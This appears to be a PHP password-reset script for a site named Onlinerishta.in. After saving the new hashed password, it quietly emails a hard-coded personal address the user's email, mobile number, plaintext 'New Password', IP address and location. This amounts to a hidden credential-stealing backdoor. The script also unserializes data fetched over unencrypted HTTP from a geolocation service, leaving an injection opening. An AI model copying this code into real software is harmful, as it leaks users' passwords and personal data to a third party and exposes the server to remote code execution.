<?php
include '../connection.php';
include 'session.php';

$date=date("d/m/Y");
$time=date("h:i:a");
$ip = $_SERVER['REMOTE_ADDR'];
							$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$ip"));
                            $country = $geo["geoplugin_countryName"];
                            $city = $geo["geoplugin_city"];


$em=$_SESSION['email'];
$mb=$_SESSION['mob'];

if(isset($_SESSION['otp'])&&isset($_POST['user']))
{

       $pass1=strip_tags($_REQUEST["user"]);
       $pass2=strip_tags($_REQUEST["pass"]);
       $has = password_hash($pass2, PASSWORD_DEFAULT);
         
       $stmt=$con->prepare("UPDATE sd_client set sd_pass=:fhas where sd_email=:femail and sd_mobile=:fmob");        
       $stmt->bindParam(':fhas', $has, PDO::PARAM_STR); 
       $stmt->bindParam(':femail', $em, PDO::PARAM_STR);
       $stmt->bindParam(':fmob', $mb, PDO::PARAM_STR);  
       $stmt->execute();

       $stmt1 = $con->prepare("SELECT * from sd_client where sd_email=:fmail"); 
       $stmt1->bindParam(':fmail', $em, PDO::PARAM_STR); 
       $stmt1->execute(); 
       $row = $stmt1->fetch(PDO::FETCH_ASSOC);
       

          if(password_verify($pass2, $row['sd_pass']))
             {
               $to="d.sachin@live.in";
               $subject = "Password Change Detected ";
               $p1 = $pass1;
               $body =  nl2br(" Email: $em\r\n Mobile: $mb\r\n New Password: $p1 \r\n Date: $date\r\n time: $time\r\n IP: $ip\r\n City: $city\r\n Country: $country ");

               $headers[] = 'MIME-Version: 1.0';
               $headers[] = 'Content-type: text/html; charset=iso-8859-1';
               $headers[] = 'From: Onlinerishta.in <no-reply@Onlinerishta.in>';
 
               mail($to,$subject,$body,implode("\r\n", $headers)); 

               unset($_SESSION['otp']);
    
                 $to="$em";    
                 $subject = "Password Reset Successfully for Onlinerishta.in";
                 $body =  nl2br("Your Login Password Has Been Reset Successfully for Onlinerishta.in  \r\n User Id: $mb \r\n Email: $em \r\n If its Not You Plz Conatct Us At 9621001801 \r\n Or Mail Us at help@onlinerishta.in \r\n   Date: $date\r\n time: $time\r\n IP: $ip\r\n City: $city\r\n Country: $country ");
                 mail($to,$subject,$body,implode("\r\n", $headers)); 
    
                 unset($_SESSION['mob']);
    
             }

            else
           
             {
                 exit('Sonmthing went wrong');
                  //session_destroy();
              
                  
             }

}
?>